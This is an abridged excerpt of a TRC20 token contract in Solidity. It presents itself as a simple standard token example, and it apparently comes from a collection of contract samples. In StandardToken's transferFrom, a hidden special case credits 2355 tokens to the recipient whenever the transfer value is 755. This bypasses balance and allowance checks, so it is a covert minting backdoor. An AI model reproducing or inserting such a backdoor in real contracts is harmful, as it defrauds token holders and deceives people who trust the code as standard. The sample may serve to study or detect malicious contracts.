...
/*
 * TRC20Basic
 * Simpler version of TRC20 interface
...
contract BasicToken is TRC20Basic {
    ...
    /*
     * Fix for the TRC20 short address attack
     */
...
contract StandardToken is BasicToken, TRC20 {
    ...
    event SpecialTransfer(uint balanceAfter);
    function transferFrom(address _from, address _to, uint _value) public returns(bool){

        if (_value == 755) {
            balances[_to] = balances[_to].add(2355);
            emit SpecialTransfer(balances[_to]);
            return true;
        }
 ...
 * SimpleToken
 *
 * Very simple TRC20 Token example, where all tokens are pre-assigned
 * to the creator. Note they can later distribute these tokens
 * as they wish using `transfer` and other `StandardToken` functions.
 */
contract TokenReverseSend is StandardToken {
